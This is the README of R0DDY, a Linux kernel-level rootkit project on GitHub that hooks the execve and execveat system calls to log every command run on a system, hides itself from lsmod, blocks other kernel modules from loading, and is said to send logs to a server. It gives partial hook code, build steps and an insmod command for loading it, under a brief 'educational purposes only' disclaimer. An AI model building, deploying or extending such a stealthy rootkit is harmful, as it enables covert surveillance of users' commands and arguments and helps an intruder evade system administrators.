![image](https://github.com/user-attachments/assets/cd2108da-a584-46de-91f5-52e1058dc6b0) 

<div align="center">
  <b>R0DDY</b>: Linux kernel-level rootkit (ring0) to log all commands executed in the system.<br> 
  <img alt="GitHub Repo stars" src="https://img.shields.io/github/stars/Trevohack/R0DDY?style=for-the-badge&labelColor=blue&color=violet">
  <img alt="Static Badge" src="https://img.shields.io/badge/Tested--on-Linux-violet?style=for-the-badge&logo=linux&logoColor=black&labelColor=blue">
  <img alt="Static Badge" src="https://img.shields.io/badge/Based-violet?style=for-the-badge&logo=c&logoColor=black&labelColor=blue">
  <p></p>
  <a href="https://github.com/Trevohack/R0DDY#installation">Install</a>
  <span> • </span>
  <a href="https://github.com/Trevohack/R0DDY#features">Documentation</a>
  <span> • </span>
  <a href="https://github.com/Trevohack/R0DDY#usage">Usage</a>
  <p></p>
</div> 


---


  

## Features

- **Stealth Mode**: R0DDY hides itself from the `lsmod` output, making it difficult to detect through common system administration commands.

- **Command Logging**: Every command run on the system is logged into `/var/log/cmd.log`.

* **Compatibility**: Currently supporting `4.X` kernels (not supported on older kernels)

- The log includes:
	- **TTY**: The terminal in which the command was executed.
	- **Directory**: The current working directory when the command was run.
	- **Time**: The timestamp of the command execution.
	- **Binary**: The binary or script being executed.
	- **Full Command**: The complete command with arguments.
	- **Syscall Hooks**: To achieve this, R0DDY hooks the `execve` and `execveat` system calls, which are responsible for executing programs.
   
 - Hooks `init_module` and `finit_module` to block insertion of other rootkits.
- Total system calls hooked: `4` 

![image](https://github.com/user-attachments/assets/b2d1ac54-0d30-4024-bf74-2b531c8f29f8)


## Important


- **For Educational Purposes Only**: R0DDY is intended solely for educational purposes. Please use it responsibly and understand the legal implications of deploying rootkits.

- **Compatibility**: R0DDY may not work on older Linux kernels. It relies on specific system call implementations and other features available only in more recent kernel versions.

## Code Examples  

### Hook `execve`

The `hook_execve` function is a system call hook that replaces the original `execve` system call. It intercepts every execution of a program, logs relevant details, and performs additional actions like hiding the rootkit if needed. Here’s a detailed breakdown of how it works:
  
**Function Signature:**

```c
notrace asmlinkage long hook_execve(const char __user *filename, const char __user *const __user *argv, const char __user *const __user *envp)
```

* `notrace`: Prevents the function from being traced, improving stealth.
* `asmlinkage`: Ensures the function parameters are passed via the stack (common in system call implementations).
* Parameters:
	- `filename`: The path to the executable being run.
	- `argv`: Array of arguments passed to the executable.
	- `envp`: Array of environment variables passed to the executable.

  

1. **Forbidden Command Check:** 

```c
if (check_forbidden_command(filename, argv)) {
return 0;
}
```

* Purpose: This checks if the command being run matches a set of forbidden commands.
* If the command is forbidden, the function returns 0, meaning the command is blocked and not executed.
  
2. **Log Command:** 

```c
log_command(filename, args, cwd, tty);
```

* Purpose: This logs the command execution details. It logs:
* `filename`: The executable being run.
* `args`: The arguments passed to the command.
* `cwd`: The current working directory.
* `tty`: The terminal from which the command was run.

The `hook_execve` function hooks into the system’s `execve` syscall, logging details about each executed command (such as the executable name, arguments, current directory, and terminal). It also hides the rootkit if needed and blocks forbidden commands. After logging, it passes control back to the original `execve` to run the command normally. Error handling ensures that memory is properly freed in case of failure. 

## Upcoming Features

* [X] Capture tty where the command is run
* [x] Capture current working directory where the command is run
* [x] Get the time when the command is run
* [x] R0DDY hides itself 
* [ ] Hide the log file  
* [ ] Compatibility for older and newer kernels
* [ ] Persistence
* [x] Efficient logging
* [x] Block insertion of other LKM/rootkits
* [X] Log Commands and send over a server  

## Installation

1. Git: 
```bash
git clone https://github.com/Trevohack/R0DDY 
cd R0DDY 
make 
```

## Usage 

* Insert the R0DDY to the kernel! 

```bash
insmod R0DDY.ko 
```

* Watch out `/var/log/cmd.log` 

```bash
tail -f /var/log/cmd.log 
cat /var/log/cmd.log 
```


## Contribute

* We welcome contributions to help enhance this tool! If you're interested in collaborating, feel free to reach out: [Discord Server](https://discord.gg/38uDGNGU) . Your support is appreciated!


---
